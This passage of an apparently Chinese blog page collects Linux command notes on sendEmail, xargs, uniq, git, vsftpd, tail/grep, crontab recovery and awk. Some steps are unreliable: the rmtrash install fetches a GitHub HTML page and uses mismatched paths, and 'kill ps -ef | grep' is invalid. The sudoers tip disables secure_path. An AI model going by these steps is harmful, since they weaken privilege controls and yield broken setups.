class="line">ttt</span><br></pre></td></tr></table></figure>
<h3 id="转换编码"><a href="#转换编码" class="headerlink" title="转换编码"></a>转换编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f ISO<span class="number">-8859</span><span class="number">-1</span> -t UTF<span class="number">-8</span> &lt; input.txt &gt; output.txt</span><br></pre></td></tr></table></figure>
<h3 id="执行算术运算"><a href="#执行算术运算" class="headerlink" title="执行算术运算"></a>执行算术运算</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">expr <span class="number">5</span> + <span class="number">2</span></span><br><span class="line">echo $[16 + 4]#https://www.itcodemonkey.com/article/11866.html</span><br></pre></td></tr></table></figure>
<h3 id="send-email"><a href="#send-email" class="headerlink" title="send email"></a>send email</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_14_centos ~]# wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz</span><br><span class="line">-<span class="number">-2018</span><span class="number">-12</span><span class="number">-20</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">34</span>--  http:<span class="comment">//caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz</span></span><br><span class="line">Resolving caspian.dotconf.net (caspian.dotconf.net)... <span class="number">159.89</span><span class="number">.153</span><span class="number">.157</span></span><br><span class="line">Connecting to caspian.dotconf.net (caspian.dotconf.net)|<span class="number">159.89</span><span class="number">.153</span><span class="number">.157</span>|:<span class="number">80.</span>.. connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">29740</span> (<span class="number">29</span>K) [application/octet-stream]</span><br><span class="line">Saving to: ‘sendEmail-v1<span class="number">.56</span>.tar.gz’</span><br><span class="line"></span><br><span class="line"><span class="number">100</span>%[===============================================================================================&gt;] <span class="number">29</span>,<span class="number">740</span>       <span class="number">159</span>KB/s   <span class="keyword">in</span> <span class="number">0.2</span>s</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span><span class="number">-12</span><span class="number">-20</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">35</span> (<span class="number">159</span> KB/s) - ‘sendEmail-v1<span class="number">.56</span>.tar.gz’ saved [<span class="number">29740</span>/<span class="number">29740</span>]</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos ~]# tar -zxvf sendEmail-v1.56.tar.gz</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/CHANGELOG</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/README</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/README-BR.txt</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/TODO</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/sendEmail</span><br><span class="line">sendEmail-v1<span class="number">.56</span>/sendEmail.pl</span><br><span class="line">[root@VM_0_14_centos ~]# cd sendEmail-v1.56/</span><br><span class="line">[root@VM_0_14_centos sendEmail-v1.56]# mv sendEmail /usr/local/bin</span><br><span class="line">#  /usr/local/bin/sendEmail -f ttlsafrom@163.com -t ttlsato@qq.com \</span><br><span class="line">    -s smtp<span class="number">.163</span>.com -u <span class="string">"我是邮件主题"</span> -o message-content-type=html \</span><br><span class="line">    -o message-charset=utf8 -xu ttlsafrom@<span class="number">163.</span>com -xp <span class="number">123456</span> -m <span class="string">"我是邮件内容"</span></span><br><span class="line">    /usr/local/bin/sendEmail 命令主程序</span><br><span class="line">    -f ttlsafrom@<span class="number">163.</span>com  发件人邮箱</span><br><span class="line">    -s smtp<span class="number">.163</span>.com       发件人邮箱的smtp服务器</span><br><span class="line">    -u <span class="string">"我是邮件主题"</span>     邮件的标题</span><br><span class="line">    -o message-content-type=html   邮件内容的格式,html表示它是html格式</span><br><span class="line">    -o message-charset=utf8        邮件内容编码</span><br><span class="line">    -xu ttlsafrom@<span class="number">163.</span>com          发件人邮箱的用户名</span><br><span class="line">    -xp <span class="number">123456</span>               发件人邮箱密码</span><br><span class="line">    -m <span class="string">"我是邮件内容"</span>        邮件的具体内容</span><br></pre></td></tr></table></figure>
<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>统计当前目录下，py文件数量：</span><br><span class="line"></span><br><span class="line">find . -name <span class="string">"*.py"</span> |wc -l</span><br><span class="line"><span class="number">2.</span>统计当前目录下，所有py文件行数：</span><br><span class="line"></span><br><span class="line">find . -name <span class="string">"*.py"</span> |xargs cat|wc -l</span><br><span class="line"><span class="number">3.</span>统计当前目录下，所有py文件行数，并过滤空行：</span><br><span class="line"></span><br><span class="line">find . -name <span class="string">"*.py"</span> |xargs cat|grep -v ^$|wc -l</span><br></pre></td></tr></table></figure>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kill ps -ef | grep <span class="string">'ddd'</span></span><br><span class="line"><span class="keyword">for</span> procid <span class="keyword">in</span> $(ps -aux | grep <span class="string">"some search"</span> | awk <span class="string">'&#123;print $2&#125;'</span>); <span class="keyword">do</span> kill <span class="number">-9</span> $procid; done</span><br><span class="line">ps -ef | grep <span class="string">'ddd'</span> | xargs kill</span><br><span class="line"> echo <span class="string">'--help'</span> | xargs cat 等价于 cat --help</span><br><span class="line"> echo <span class="string">'11@22@33'</span> | xargs -d <span class="string">'@'</span> echo<span class="comment">//11 22 33</span></span><br><span class="line"> echo <span class="string">'11@22@33'</span> | xargs -p -d <span class="string">'@'</span> echo<span class="comment">//不会马上执行其后面的命令，而是输出即将要执行的完整的命令 echo 11 22 33</span></span><br><span class="line"> ?...y ==&gt;这里询问是否执行命令 echo <span class="number">11</span> <span class="number">22</span> <span class="number">33</span> 输入y并回车，则显示执行结果，否则不执行</span><br><span class="line"> https:<span class="comment">//laravel-china.org/articles/21339</span></span><br><span class="line"> find . -name <span class="string">"*.txt"</span></span><br><span class="line"> 输出：</span><br><span class="line"> </span><br><span class="line"> ./<span class="number">2.</span>txt</span><br><span class="line"> ./<span class="number">3.</span>txt</span><br><span class="line"> ./<span class="number">1.</span>txt     =&gt; 默认情况下find的输出结果是每条记录后面加上换行，也就是每条记录是一个新行</span><br><span class="line"> </span><br><span class="line"> find . -name <span class="string">"*.txt"</span> -print0</span><br><span class="line"> 输出：</span><br><span class="line"> </span><br><span class="line"> ./<span class="number">2.</span>txt./<span class="number">3.</span>txt./<span class="number">1.</span>txt     =&gt; 加上 -print0 参数表示find输出的每条结果后面加上 <span class="string">'\0'</span> 而不是换行</span><br><span class="line"> </span><br><span class="line"> find . -name <span class="string">"*.txt"</span> -print0 | xargs <span class="number">-0</span> echo</span><br><span class="line"> 输出：</span><br><span class="line"> </span><br><span class="line"> ./<span class="number">2.</span>txt ./<span class="number">3.</span>txt ./<span class="number">1.</span>txt</span><br><span class="line"> </span><br><span class="line"> find . -name <span class="string">"*.txt"</span> -print0 | xargs -d <span class="string">'\0'</span> echo</span><br><span class="line"> 输出：</span><br><span class="line"> ./<span class="number">2.</span>txt ./<span class="number">3.</span>txt ./<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
<h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#uniq -h</span><br><span class="line">长选项必须使用的参数对于短选项时也是必需使用的。  </span><br><span class="line"> -c, --count              <span class="comment">//在每行前加上表示相应行目出现次数的前缀编号  </span></span><br><span class="line"> -d, --repeated          <span class="comment">//只输出重复的行  </span></span><br><span class="line"> -D, --all-repeated      <span class="comment">//只输出重复的行，不过有几行输出几行  </span></span><br><span class="line"> -f, --skip-fields=N     <span class="comment">//-f 忽略的段数，-f 1 忽略第一段  </span></span><br><span class="line"> -i, --ignore-<span class="keyword">case</span>       <span class="comment">//不区分大小写  </span></span><br><span class="line"> -s, --skip-chars=N      <span class="comment">//根-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符  </span></span><br><span class="line"> -u, --unique            <span class="comment">//去除重复的后，全部显示出来，根mysql的distinct功能上有点像  </span></span><br><span class="line"> -z, --zero-terminated   end lines <span class="keyword">with</span> <span class="number">0</span> byte, not newline  </span><br><span class="line"> -w, --check-chars=N      <span class="comment">//对每行第N 个字符以后的内容不作对照  </span></span><br><span class="line"> --help              <span class="comment">//显示此帮助信息并退出  </span></span><br><span class="line"> --version              <span class="comment">//显示版本信息并退出 </span></span><br><span class="line">显示有重复的行</span><br><span class="line">$ uniq -d -c uniqtest  </span><br><span class="line">  <span class="number">3</span> <span class="keyword">this</span> is a test  </span><br><span class="line">  <span class="number">2</span> i love tank </span><br><span class="line">  uniq -D 只显示重复的行，并且把重复几行都显示出来。他不能和-c一起使用</span><br><span class="line">  仅显示不重复的行 sort testfile | uniq -u</span><br></pre></td></tr></table></figure>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询访问时间</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;<span class="number">1.</span><span class="number">.100</span>&#125;;<span class="keyword">do</span> curl -o /dev/<span class="literal">null</span> -s   -w <span class="string">"$i | time_namelookup: %&#123;time_namelookup&#125; | time_connect: %&#123;time_connect&#125; | time_starttransfer: %&#123;time_starttransfer&#125; | time_total: %&#123;time_total&#125;\n"</span> -x <span class="string">"10.71.48.129:80"</span> <span class="string">"http://www.baidu.com"</span>; done</span><br></pre></td></tr></table></figure>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">yum install vsftpd</span><br><span class="line">启动ftp命令#service vsftpd start</span><br><span class="line"></span><br><span class="line">停止ftp命令#service vsftpd stop</span><br><span class="line"></span><br><span class="line">重启ftp命令#service vsftpd restart</span><br><span class="line">[root@VM_0_14_centos ~]# useradd test</span><br><span class="line">[root@VM_0_14_centos ~]# passwd test</span><br><span class="line">Changing password <span class="keyword">for</span> user test.</span><br><span class="line">New password:</span><br><span class="line">BAD PASSWORD: The password is shorter than <span class="number">8</span> characters</span><br><span class="line">Retype <span class="keyword">new</span> password:</span><br><span class="line">Sorry, passwords <span class="keyword">do</span> not match.</span><br><span class="line">New password:</span><br><span class="line">Retype <span class="keyword">new</span> password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@VM_0_14_centos ~]# ll /home/test/</span><br><span class="line">total <span class="number">0</span></span><br><span class="line">[root@VM_0_14_centos ~]# cd /home/test/</span><br><span class="line">[root@VM_0_14_centos test]# touch test.php</span><br><span class="line">然后使用filezilla链接ftp test账号登录看到的就是/home/test/下的文件</span><br></pre></td></tr></table></figure>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">使用通配符提交 git add *.js</span><br><span class="line">只删除版本库中文件但保存项目目录中文件 git rm --cached index.php</span><br><span class="line">放弃没有提交的修改 git checkout .</span><br><span class="line">删除没有add 的文件和目录 git clean -fd</span><br><span class="line">显示将要删除的文件或目录 git clean -n</span><br><span class="line">查看最近<span class="number">2</span>次提交日志并显示文件差异 git log -p <span class="number">-2</span></span><br><span class="line">一行显示并只显示SHA<span class="number">-1</span>的前几个字符 git log --oneline</span><br><span class="line">git config --global alias.c commit 使用 git c 实现 git commit  一样的效果了</span><br><span class="line">$ git log --graph --pretty=format:<span class="string">'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset'</span> --abbrev-commit</span><br><span class="line">*   <span class="number">1</span>edc0f8c - (HEAD -&gt; temp, origin/master, origin/HEAD, master) Merge branch <span class="string">'master'</span> into temp (<span class="number">3</span> hours ago) &lt;xxx&gt;</span><br><span class="line">|\</span><br><span class="line">| * <span class="number">7</span>bd6895a - Merge branch <span class="string">'dev'</span>pay/right优化 (<span class="number">5</span> hours ago) &lt;xxx&gt;</span><br><span class="line">| *   d81f7be5 - Merge branch <span class="string">'temp'</span> (<span class="number">6</span> hours ago) &lt;xxx&gt;</span><br><span class="line">创建并切换分支 git checkout -b feature/bbs</span><br><span class="line">删除远程分支 git push origin :dev</span><br><span class="line">储藏工作 git stash</span><br><span class="line">查看储藏列表 git stash list</span><br><span class="line">应用最近的储藏 git stash apply</span><br><span class="line">应用并删除储藏 git stash pop</span><br><span class="line">对mster分支代码生成压缩包供使用者下载使用，--prefix 指定目录名</span><br><span class="line">git archive master --prefix=<span class="string">'hdcms/'</span> --format=zip &gt; hdcms.zip</span><br><span class="line"></span><br><span class="line">删除远程ask分支 git push origin --<span class="keyword">delete</span> ask</span><br><span class="line">本地ask分支关联远程分支并推送 git push --set-upstream origin ask</span><br><span class="line"># 增加一个远程库</span><br><span class="line">git remote add github git@github.com:houdunwang/coding.git</span><br><span class="line"></span><br><span class="line"># 提交到远程库</span><br><span class="line">git push github</span><br><span class="line">git remote add origin git@github.com:houdunwang/hd-xj.git</span><br><span class="line">拉取origin主机的ask分支与本地的master分支合并 git pull origin ask:ask</span><br><span class="line">拉取origin主机的ask分支与当前分支合并 git pull origin ask</span><br></pre></td></tr></table></figure>
<h3 id="查找清理大文件"><a href="#查找清理大文件" class="headerlink" title="查找清理大文件"></a>查找清理大文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[cuihuan:~ cuixiaohuan]$ df -h</span><br><span class="line">Filesystem Size Used Avail Use% Mounted on</span><br><span class="line">/dev/sda2 <span class="number">8.2</span>G <span class="number">6.7</span>G <span class="number">1.6</span>G <span class="number">82</span>% <span class="regexp">/</span></span><br><span class="line"><span class="regexp">/</span>dev/sda3 <span class="number">1.4</span>T <span class="number">1.3</span>T <span class="number">50</span>G <span class="number">97</span>% <span class="regexp">/home</span></span><br><span class="line"><span class="regexp">1.5T的硬盘占用了97%，确实不够用了</span></span><br><span class="line"><span class="regexp">[cuihuan:~]$ du -sh * | grep G</span></span><br><span class="line"><span class="regexp">。。。</span></span><br><span class="line"><span class="regexp">73G mongodb</span></span><br><span class="line"><span class="regexp">103G mxm</span></span><br><span class="line"><span class="regexp">2.1G online</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/cuihuan.net/</span><span class="number">2015</span>/<span class="number">12</span>/<span class="number">08</span>/linux%<span class="number">20</span>%E6%<span class="number">9</span>F%A5%E6%<span class="number">89</span>%BE%E6%B8%<span class="number">85</span>%E7%<span class="number">90</span>%<span class="number">86</span>%E5%A4%A7%E6%<span class="number">96</span>%<span class="number">87</span>%E4%BB%B6/</span><br></pre></td></tr></table></figure>
<h3 id="crontab-误删除恢复"><a href="#crontab-误删除恢复" class="headerlink" title="crontab 误删除恢复"></a>crontab 误删除恢复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat /<span class="keyword">var</span>/log/cron | grep -i <span class="string">"`which cron`"</span> &gt; ./all_temp</span><br><span class="line">cat  ./all_temp | grep -v <span class="string">"&lt;command&gt;” &gt; ./cmd_temp</span></span><br><span class="line"><span class="string">awk -F'(' '/crond/&#123;a[$3]=$0&#125;END&#123;for(i in a)print a[i]&#125;' /var/log/cron* &gt;crontab.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">从crontab.txt 中找出每一条指令，然后在cmd_temp 中匹配运行次数，重新编辑crontab 添加</span></span><br><span class="line"><span class="string">每天对crontab进行备份，备份最近15天的数据。</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string"># 每天对crontab 进行备份 ，同时删除最近15天的数据</span></span><br><span class="line"><span class="string">DATE=$(date +%Y%m%d)</span></span><br><span class="line"><span class="string">crontab -l &gt; /home/work/bak/crontab_$DATE.bak</span></span><br><span class="line"><span class="string">find /home/work/bak/ -mtime +15 -name '*.bak' -exec rm -rf &#123;&#125; \;</span></span><br><span class="line"><span class="string">http://cuihuan.net/2015/12/03/crontab%20%E8%AF%AF%E5%88%A0%E9%99%A4%E6%81%A2%E5%A4%8D/</span></span><br></pre></td></tr></table></figure>
<h3 id="tail-grep"><a href="#tail-grep" class="headerlink" title="tail grep"></a>tail grep</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//itbilu.com/linux/man/H1_dxWhz4.html</span></span><br><span class="line">现有itbilu.log日志文件，查看其后<span class="number">5</span>行：</span><br><span class="line"></span><br><span class="line">$ tail -n <span class="number">-5</span> itbilu.log</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">$ tail -n <span class="number">5</span> itbilu.log</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">$ tail <span class="number">-5</span> itbilu.log</span><br><span class="line">查看第<span class="number">100</span>行至文件末尾：</span><br><span class="line"></span><br><span class="line">$ tail -n +<span class="number">100</span> itbilu.log</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">$ tail +<span class="number">100</span> itbilu.log</span><br><span class="line">配合head命令，实现查看文件的第<span class="number">10</span>到<span class="number">20</span>行：</span><br><span class="line"></span><br><span class="line">$ head <span class="number">-20</span> itbilu.log | tail <span class="number">-10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实时查看日志</span><br><span class="line"></span><br><span class="line">通过-f参数，我们可以实时查看文件的新增内容：</span><br><span class="line"></span><br><span class="line">$ tail -f itbilu.log</span><br><span class="line">注意：使用-f参数时不会中断文件监视，需要通过ctrl+c手动结束。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实时日志查看与grep过滤关键字</span><br><span class="line"></span><br><span class="line">通过-f参数，并配合grep命令，可以实现对文件内容的过滤。如：查看前几行、后几行、或前后几行，这时可以通过以下几个参数实现：</span><br><span class="line"></span><br><span class="line">-A &lt;显示行数&gt;            除了显示符合匹配内容的那一行之外，并显示该行之后的内容</span><br><span class="line">-B &lt;显示行数&gt;            在显示符合匹配内容的那一行之外，并显示该行之前的内容</span><br><span class="line">-C &lt;显示行数&gt;或-&lt;显示行数&gt; 除了显示符合匹配内容的那一列之外，并显示该列之前后的内容</span><br><span class="line">监控itbilu.log日志件，并查看含有'foo'关键字的前后5行：</span><br><span class="line"></span><br><span class="line">$ tail -f itbilu.log|grep 'foo' -C 5</span><br><span class="line">// 或</span><br><span class="line">$ tail -f itbilu.log|grep 'foo' -5</span><br><span class="line"></span><br><span class="line">查找/code目录下js文件，显示包括itbilu.com的行。命令如下：</span><br><span class="line"></span><br><span class="line"># find ./code -name '*.js'|xargs grep -n 'itiblu.com'</span><br><span class="line"># expr 10 + 20</span><br><span class="line">30</span><br><span class="line"></span><br><span class="line">用expr命令计算字符串的长度。命令如下：</span><br><span class="line"></span><br><span class="line"># str="hello world"</span><br><span class="line"># expr length "$str"</span><br><span class="line">11</span><br><span class="line"></span><br><span class="line"> $ stat routes.php</span><br><span class="line">  File: `routes.php'</span><br><span class="line">  Size: 24191           Blocks: 48         IO Block: 4096   regular file</span><br><span class="line">Device: 811h/2065d      Inode: 7217947     Links: 1</span><br><span class="line">Access: (0775/-rwxrwxr-x)  Uid: (  611/ UNKNOWN)   Gid: (  612/ UNKNOWN)</span><br><span class="line">Access: 2019-10-12 15:21:30.733152751 +0800</span><br><span class="line">Modify: 2018-12-14 14:23:34.406787125 +0800</span><br><span class="line">Change: 2018-12-14 14:23:34.406787125 +0800</span><br><span class="line">现有file1和file2两个文件，file内容为1121，file2内容为1123。比较file1和file2两个文件的差异，参数如下：</span><br><span class="line"></span><br><span class="line">cmp file1 file2</span><br><span class="line">比较file1和file2两个文件的差异，然后使用diffstat命令对结果进行统计显示。命令如下：</span><br><span class="line"></span><br><span class="line">diff file1 file2 | diffstat</span><br></pre></td></tr></table></figure>
<h3 id="sudo-command-not-found"><a href="#sudo-command-not-found" class="headerlink" title="sudo command not found"></a>sudo command not found</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 env_keep 中增加 PATH 字段</span><br><span class="line"></span><br><span class="line">vim /etc/sudoers</span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH"</span></span><br><span class="line"># 注释掉 secure_path</span><br><span class="line">#Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></table></figure>
<h3 id="避免-rm-误操作"><a href="#避免-rm-误操作" class="headerlink" title="避免 rm 误操作"></a>避免 rm 误操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//github.com/LaiJingli/rmtrash/blob/master/rmtrash.sh</span></span><br><span class="line">mv rmtrash.sh /usr/local/bin #移动到bin目录下</span><br><span class="line">chmod +x /bin/rmtrash.sh #增加可执行权限</span><br><span class="line">vim ~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">#增加别名</span></span><br><span class="line"><span class="regexp">alias rm=/</span>bin/rmtrash.sh</span><br><span class="line">rmtrash -h #帮助命令</span><br><span class="line">rmtrash -e #清空回收站</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35041</span></span><br></pre></td></tr></table></figure>
<h3 id="awk-1"><a href="#awk-1" class="headerlink" title="awk"></a>awk</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">系统突然出现卡顿，常用的排查思路有哪些呢？</span><br><span class="line"></span><br><span class="line">查看内存使用状况：free -g</span><br><span class="line">查看磁盘使用状况：df -h</span><br><span class="line">查看磁盘 I/O 使用：iostat -dx</span><br><span class="line">查看 CPU 使用：top</span><br><span class="line">[release@api_02 ~]$ last -n <span class="number">5</span> | awk <span class="string">'&#123;print $1 "\t lines:" NR "\t columns:"NF&#125;'</span></span><br><span class="line">release  lines:<span class="number">1</span>     columns:<span class="number">10</span></span><br><span class="line">release  lines:<span class="number">2</span>     columns:<span class="number">10</span></span><br><span class="line">release  lines:<span class="number">3</span>     columns:<span class="number">10</span></span><br><span class="line">release  lines:<span class="number">4</span>     columns:<span class="number">10</span></span><br><span class="line">release  lines:<span class="number">5</span>     columns:<span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>有洁癖的同学可以使用 docker-compose，推荐一下自己构建的（<a href="https://gitee.com/nxs/docker-compose）" target="_blank" rel="noopener">https://gitee.com/nxs/docker-compose）</a>  </p>
<p><a href="https://learnku.com/articles/28500" target="_blank" rel="noopener">最好的 Linux 桌面版—- Windows 10 安装体验 </a></p>
<p><a href="https://segmentfault.com/a/1190000016837948" target="_blank" rel="noopener">linux 常用命令top、awk、sed等</a></p>
<p><a href="http://blog.51yip.com/shell/986.html" target="_blank" rel="noopener">sed很强大的文本操作命令</a></p>
<p><a href="http://blog.51yip.com/server/1960.html" target="_blank" rel="noopener">ubuntu sentry 安装配置</a></p>
<p><a href="https://linux.cn/article-10342-shareweibo.html" target="_blank" rel="noopener">数据科学家的命令行技巧</a></p>
<p><a href="https://laravel-china.org/articles/21339" target="_blank" rel="noopener">xargs 命令详解</a></p>
<p><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" target="_blank" rel="noopener">Linux 命令行的艺术</a></p>
<p><a href="http://blog.51yip.com/shell/1022.html" target="_blank" rel="noopener">linux下去除重复行命令uniq</a></p>
<p><a href="https://gywbd.github.io/posts/2014/8/50-linux-commands.html" target="_blank" rel="noopener">50个最常用的Unix/Linux命令 </a></p>
